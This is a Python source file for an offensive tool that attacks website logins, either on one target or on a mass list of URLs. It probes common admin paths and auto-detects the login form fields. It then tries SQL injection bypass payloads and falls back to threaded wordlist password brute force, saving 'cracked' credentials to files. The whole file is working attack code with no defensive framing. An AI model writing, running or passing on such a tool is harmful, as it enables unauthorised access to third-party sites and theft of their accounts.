#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Brute Force Login with SQL Injection Bypass
# Requirements: pip install robobrowser, beautifulsoup4 
# Python 3

import werkzeug
werkzeug.cached_property = werkzeug.utils.cached_property
from robobrowser import RoboBrowser
import re, sys, time, threading, warnings
from bs4 import BeautifulSoup

if not sys.warnoptions:
    warnings.simplefilter("ignore")

print('''
 ▐▄▄▄      Brute Force Login Automatic Mode
  ·██▪     ▪     Auto Detect Fields with SQLi Bypass v.1.1
▪▄ ██ ▄█▀▄  ▄█▀▄
▐▌▐█▌▐█▌.▐▌▐█▌.▐▌ 
 ▀▀▀• ▀█▄▀▪ ▀█▄▀▪
''')


class color:
    r = '\033[91m'
    g = '\033[92m'
    y = '\033[93m'
    g = '\033[92m'
    b = '\033[0m'


def get_target_urls():
    target_type = input("[1] Single\n[2] Mass\nChoose target type (1 or 2): ")
    targets = []
    if target_type == '1':
        url = input("Enter the target URL (without /login or /administrator): ")
        targets.append(url.strip())
    elif target_type == '2':
        file_path = input("Enter the path to the target list file: ")
        try:
            with open(file_path, 'r') as f:
                targets = [line.strip() for line in f.readlines()]
        except FileNotFoundError:
            print(f"[!] Can't find {file_path}. Does it exist?")
            sys.exit(1)
    else:
        print("[!] Invalid choice. Please choose 1 or 2.")
        sys.exit(1)
    return targets


def find_login_page(url):
    # List login page paths to check
    common_login_paths = ['/login.php', '/admin', '/administrator', '/user/login', '/wp-login.php']
    
    for path in common_login_paths:
        full_url = f"{url}{path}"
        try:
            robot = RoboBrowser(history=False)
            robot.open(full_url, verify=False)
            if robot.response.status_code == 200:
                print(f"{color.y}[+] Found login page at {full_url}{color.b}")
                return full_url
        except Exception as e:
            pass

    print(f"{color.r}[!] Login page not found for {url}.{color.b}")
    return None


def auto_detect_login_fields(url):
    try:
        robot = RoboBrowser(history=False)
        robot.open(url, verify=False)

        soup = BeautifulSoup(str(robot.parsed), "html.parser")
        form = soup.find('form')
        
        # Detect login fields (text for username, password field)
        username_field = None
        password_field = None

        if form:
            for input_tag in form.find_all("input"):
                if input_tag.get("type") == "text":
                    username_field = input_tag.get("name")
                elif input_tag.get("type") == "password":
                    password_field = input_tag.get("name")

        if username_field and password_field:
            return form['action'], username_field, password_field
        else:
            print(f"{color.r}[!] Couldn't detect login fields at {url}.{color.b}")
            return None, None, None
    except Exception as e:
        print(f"{color.r}[!] Error detecting form at {url}: {e}{color.b}")
        return None, None, None


def DoTheThing(url, username, password, form_action, username_field, password_field):
    try:
        robot = RoboBrowser(history=False)

        # Periksa apakah form_action sudah dimulai dengan '/'
        if not form_action.startswith('/'):
            form_action = '/' + form_action
        
        full_url = f"{url}{form_action}"
        robot.open(full_url, verify=False)

        form = robot.get_form()

        if form is None:
            print(f"{color.r}[!] Login form not found at {full_url}.{color.b}")
            return

        form[username_field].value = username
        form[password_field].value = password.strip()

        # Simpan URL sebelum form submit
        initial_url = robot.response.url
        
        robot.submit_form(form)

        # Cek apakah terjadi redirect dengan membandingkan URL sebelum dan sesudah submit
        if robot.response.url != initial_url:
            # Setelah redirect, cek apakah ada elemen <div class="alert ..."> di halaman
            alert_found = robot.parsed.find('div', class_=re.compile(r'alert'))
            
            if alert_found:
                print(f"{color.r}[!] Login Failed (Alert Detected): {color.b}{username} : {password.strip()}")
            else:
                print(f"{color.g}[!] Cracked: {color.b}{username} : {password.strip()}")
                save_successful_login(url, username, password)
        else:
            print(f"{color.r}[*] Trying: {color.b}{username} : {password.strip()}")
    except Exception as e:
        print(f"{color.r}[!] Error: {e}{color.b}")

def sql_injection_bypass(url, form_action, username_field, password_field):
    try:
        with open('config/bypass.txt', 'r') as f:
            bypass_payloads = f.readlines()

        robot = RoboBrowser(history=False)

        # Periksa apakah form_action sudah dimulai dengan '/'
        if not form_action.startswith('/'):
            form_action = '/' + form_action
        
        full_url = f"{url}{form_action}"
        robot.open(full_url, verify=False)

        form = robot.get_form()

        for payload in bypass_payloads:
            payload = payload.strip()
            form[username_field].value = payload
            form[password_field].value = payload
            
            # Simpan URL sebelum form submit
            initial_url = robot.response.url

            robot.submit_form(form)

            # Cek apakah terjadi redirect
            if robot.response.url != initial_url:
                # Setelah redirect, cek apakah ada elemen <div class="alert ..."> di halaman
                alert_found = robot.parsed.find('div', class_=re.compile(r'alert'))
                
                if alert_found:
                    print(f"{color.r}[!] SQLi Bypass Failed (Alert Detected): {color.b}{payload}")
                else:
                    print(f"{color.g}[!] SQLi Bypass Success: {color.b}{payload}")
                    save_successful_login(url, payload, payload)
                    return True  # Bypass berhasil
            else:
                print(f"{color.r}[*] Trying SQLi Bypass: {color.b}{payload}")

    except Exception as e:
        print(f"{color.r}[!] SQLi Bypass Error: {e}{color.b}")

    return False  # Bypass gagal


def worker(url, username, pass_list, form_action, username_field, password_field):
    for password in pass_list:
        DoTheThing(url, username, password, form_action, username_field, password_field)


def save_successful_login(url, username, password):
    target_name = url.replace('http://', '').replace('https://', '').replace('/', '_')
    with open(f"result/login_success_{target_name}.txt", "a") as result_file:
        result_file.write(f"{url}==>{username}:{password}\n")


def main():
    targets = get_target_urls()
    username = input("Enter the username (leave blank for SQLi bypass): ")
    wordlist = input("Enter the path to the password list: ")

    try:
        with open(wordlist, 'r') as f:
            pass_list = f.readlines()
        print(f'[+] Using password wordlist {color.y}{wordlist}{color.b} and username {color.y}{username}.{color.b}')

        threads = []
        for target in targets:
            print(f"{color.y}[+] Searching for login page on {target}{color.b}")
            login_page = find_login_page(target)

            if not login_page:
                continue  # Skip to the next target if login page not found
            
            print(f"{color.y}[+] Trying attack on {login_page}{color.b}")
            
            form_action, username_field, password_field = auto_detect_login_fields(login_page)
            
            if username_field and password_field:
                # Try SQL Injection Bypass first
                if sql_injection_bypass(login_page, form_action, username_field, password_field):
                    continue  # If SQLi succeeds, skip to the next target

                # Proceed to normal brute force if SQLi bypass fails
                t = threading.Thread(target=worker, args=(login_page, username, pass_list, form_action, username_field, password_field))
                t.start()
                threads.append(t)
                if len(threads) >= 10:  # Limit to 10 threads at a time
                    for thread in threads:
                        thread.join()
                    threads = []

        for thread in threads:  # Join remaining threads
            thread.join()

        print("[+] Finished!")
    except FileNotFoundError:
        print(f"[!] Can't find {wordlist}. Does it exist?")
        sys.exit(1)


if __name__ == "__main__":
    main()
